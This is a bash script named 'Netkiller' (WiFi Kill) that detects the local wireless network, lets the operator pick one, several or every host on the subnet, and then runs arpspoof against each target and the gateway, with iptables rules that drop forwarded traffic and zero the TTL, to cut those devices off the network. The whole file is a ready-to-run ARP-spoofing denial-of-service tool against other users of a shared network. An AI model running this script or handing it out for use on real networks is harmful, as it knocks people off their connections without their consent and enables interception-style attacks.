#!/bin/bash

echo -e "\e[1;91m"
echo "

       ███╗   ██╗███████╗████████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
       ████╗  ██║██╔════╝╚══██╔══╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
       ██╔██╗ ██║█████╗     ██║   █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
       ██║╚██╗██║██╔══╝     ██║   ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
       ██║ ╚████║███████╗   ██║   ██║  ██╗██║███████╗███████╗███████╗██║  ██║
       ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                       WiFi Kill
"
echo -e "\e[1;92m                           Author: [x!v3r] github.com/xiv3r \e[0m"
echo -e "\e[0m"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" >&2
    exit 1
fi

echo ""
# Detect interface
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)

# Detect gateway
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')

# Detect device IP
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)

# Detect cidr
IP_CIDR=$(ip -4 addr show "$WLAN" | grep -oP 'inet \K[\d./]+')
SUB=$(ipcalc -n "$IP_CIDR" | grep "Network:" | awk '{print $2}')

echo ""

echo "[ Current Network Information] "
echo "[*] Interface: $WLAN"
echo "[*] Gateway IP: $GW"
echo "[*] Subnet IP: $SUB"
echo "[*] Device IP: $IP"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Skip for default"
read -r -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Router Gateway IP: Skip for default"
read -r -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Subnet
echo "Enter Subnet mask: Skip for default"
read -r -p "> $SUB " IPS
NETWORK_CIDR="${IPS:-$SUB}"
echo ""

# Detect Device IP
echo "Enter Device IP: Skip for default"
read -r -p "> $IP " DEVIP
MYIP="${DEVIP:-$IP}"
echo ""

# Prompt configuration
echo "[ Target Network Configuration ]"
echo "[*] INTERFACE: | $INTERFACE"
echo "[*] GATEWAY:   | $GATEWAY"
echo "[*] DEVICE IP: | $MYIP"
echo "[*] TARGETS:   | $SUB"
echo ""

# Prompt the user for confirmation
read -p "[*] Do you want to scan the network? (y/n) " -n 1 -r
echo

if [[ $REPLY =~ ^[Yy]$ ]]
then

# Run arp-scan to scan the target
echo ""
echo "[*] [ Scanning for Target ] [*]"
echo""
    # Execute the command if user answered 'y' or 'Y'
    arp-scan --retry=5 --bandwidth=100000 --random --localnet --interface="$WLAN"
else
    # Skip if user answered anything else
    echo "[*] Skipping..."
fi
echo " "

# Target selection
echo "[*] Select Attack Type [*]"
echo "1.Single Target IP"
echo "2.Multiple Target IP's"
echo "3.Target All IP's"
read -rp "Enter Choice [1-3]: " target_type
echo ""

case $target_type in
    1)
        echo "Single Target User IP: e.g 10.0.0.123"
        read -rp "Enter User IP: " TARGET
        TARGETS=("$TARGET")
        ;;
    2)
        echo "Multiple Target Users IP's: e.g 10.0.0.123 10.0.0.124"
        read -rp "Enter Multiple Users IP's: " -a TARGETS
        ;;
    3)
        echo "Target All Users IP's: Enter for default"
        read -r -p "> $SUB " IPS
        subnet="${IPS:-$SUB}"


        # Validate subnet
        if ! ipcalc -n "$subnet" &>/dev/null; then
            echo "Invalid subnet format. Please use CIDR notation e.g 10.0.0.1/20" >&2
            exit 1
        fi

        # Get network range using ipcalc
        NETWORK_INFO=$(ipcalc -n "$subnet")
        NETWORK_ADDR=$(echo "$NETWORK_INFO" | grep 'Network:' | awk '{print $2}' | cut -d'/' -f1)
        NETMASK=$(echo "$NETWORK_INFO" | grep 'Netmask:' | awk '{print $2}')
        BROADCAST=$(echo "$NETWORK_INFO" | grep 'Broadcast:' | awk '{print $2}')
        FIRST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMin:' | awk '{print $2}')
        LAST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMax:' | awk '{print $2}')

        # Generate all IPs in range except gateway and our IP
        IFS=. read -r i1 i2 i3 i4 <<< "$FIRST_HOST"
        IFS=. read -r l1 l2 l3 l4 <<< "$LAST_HOST"

        TARGETS=()
        for ((a=i1; a<=l1; a++)); do
            for ((b=i2; b<=l2; b++)); do
                for ((c=i3; c<=l3; c++)); do
                    for ((d=i4; d<=l4; d++)); do
                        ip="$a.$b.$c.$d"
                        # Skip network, broadcast, gateway and our IP
                        if [[ "$ip" != "$NETWORK_ADDR" && "$ip" != "$BROADCAST" && "$ip" != "$GATEWAY" && "$ip" != "$MYIP" ]]; then
                            TARGETS+=("$ip")
                        fi
                    done
                done
            done
        done

        if [ ${#TARGETS[@]} -eq 0 ]; then
            echo "No valid targets found in subnet." >&2
            exit 1
        fi

       echo ""
       echo "Found ${#TARGETS[@]} potential targets in subnet"

        # Option to exempt additional IPs
        echo ""
        read -rp "Do you want to exempt any additional IP's from the subnet attack? (y/n) " exempt_choice
        if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
            echo ""
            echo "Enter IP's to exempt: e.g 10.0.0.110 10.0.0.120"
            read -rp "> " -a EXEMPTS

            # Remove exempt IPs from targets
            NEW_TARGETS=()
            for target in "${TARGETS[@]}"; do
                skip=
                for exempt in "${EXEMPTS[@]}"; do
                    if [[ "$target" == "$exempt" ]]; then
                        skip=1
                        break
                    fi
                done
                [[ -z $skip ]] && NEW_TARGETS+=("$target")
            done
            TARGETS=("${NEW_TARGETS[@]}")
            echo ""
            echo "Updated targets after exemption: ${#TARGETS[@]} remaining"
        fi
        ;;
    *)
        echo "Invalid choice" >&2
        exit 1
        ;;
esac

if [ ${#TARGETS[@]} -eq 0 ]; then
    echo "No valid targets specified." >&2
    exit 1
fi

# Confirm before proceeding
echo -e "\nNumber of target IP's affected: ${#TARGETS[@]}"
echo ""
read -rp "Are you sure you want to continue? (y/n) " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Aborted."
    exit 0
fi

# Iptables policy
iptables -P FORWARD DROP
iptables -I FORWARD -j DROP
iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0

# Start ARP spoofing for each target
PIDS=()
for TARGET in "${TARGETS[@]}"; do
    echo ""
    echo "Netkiller kill the connection of $TARGET"

    # Bidirectional blocking
   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
    PIDS+=($!)
done

# Function to clean up
cleanup() {
    exec &>/dev/null

    echo -e "\nCleaning up..."
    # Kill all arpspoof processes
    for pid in "${PIDS[@]}"; do
        kill -9 "$pid" 2>/dev/null
    done

    # Flush iptables rules
    ip -s -s neigh flush all >/dev/null 2>&1
    iptables -P FORWARD ACCEPT
    iptables -F FORWARD
    iptables -t mangle -A PREROUTING -i "$INTERFACE" -j TTL --ttl-set 64
    echo ""
    echo "Restoring the connection..."
}

# Trap Ctrl+C
trap cleanup EXIT

echo -e "\nNetkiller attack is running. Press Ctrl+C to stop..."
while true; do
    sleep 1
done
